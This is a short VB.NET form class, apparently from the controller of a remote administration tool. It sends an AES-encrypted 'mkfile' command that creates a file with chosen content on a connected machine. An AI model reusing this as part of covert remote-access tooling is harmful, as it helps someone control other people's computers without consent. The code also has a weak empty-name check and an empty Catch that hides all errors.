Public Class newfile
    Public connected As Connection
    Public path As String

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If IsNothing(TextBox1.Text) Then
                MsgBox("Please set a File Name !", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("mkfile" & path & TextBox1.Text & "|" & RichTextBox1.Text, Form1.enckey))

            Me.Close()
        Catch
        End Try
    End Sub
End Class